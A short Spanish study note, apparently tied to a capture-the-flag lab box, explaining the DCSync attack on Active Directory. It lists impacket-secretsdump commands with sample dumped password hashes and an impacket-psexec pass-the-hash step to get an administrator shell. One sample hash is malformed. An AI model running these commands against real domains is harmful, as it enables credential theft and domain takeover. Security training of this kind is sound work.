-----
- Tags: #ataque #teoria #practica #windows 
-----
# DCsync Attack
Permite al atacante simular el comportamiento del Domain Controller 
##### ( #DC ) y recuperar datos de conraseñas a través de replicación de domino. 

Proceso: 

- ##### El atacante descubre el domain controller para solicitar la replicación.
- ##### El atacante solicita la replicación de usuarios mediante #GetNCChangesolic 
- ##### El DC retorna la respuesta, inluyendo los hashes de las contraseñas de los usuarios. 

##### Muchas veces la infraestructura de las organizaciones necesita más de un #DC, para el #AD. Para mantener la choerencia de un entorno con más de un DC , es necesario que los objetos de AD se repliquen a través de esos DC. 
##### La mayoria de las tareas relacionadas con la replicación se especifican en el Protocolo remoto de Serivico de replicación de directorios. 

## Explotación 

##### Cuando un usuario posee los permisos de GetChanges y GetChangesAll podrá realizar una replicación de dominio, de esta manera podemos usar herramientas como impacket para obtener los hashes de las contraseñas de los usuarios...

```shell
impacket-secretsdump {domain}/{user}@{target_ip}

# Ejemplo 
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/userx@10.10.10.175
# Esto realizara la replicación y nos arrojara algo como lo siguiente: 
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ffjava802229e466e2c:::
# En donde podemos ver los hashes de las contraseñas de los usuarios, por ejemplo, el hash de la password de el usuario Administrator es "823452073d75b9d1cf70ebdf86c7f98e", 
```

##### Teniendo el hash de la contraseña del usuario, podemos utlizar la herramienta "impacket-psexec" (Herramienta de línea de comandos que permite a los admins de sistemas ejecutar comandos), para solicitar un consola interactiva:

```shell
impacket-psexec {domain}/{user}@{target_ip} cmd.exe --hashes :{hash}
# Esto nos arrojaria una consola interactiva con permisos de administrador

# Ejemplo 
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe --hashes :823452073d75b9d1cf70ebdf86c7f98e

```
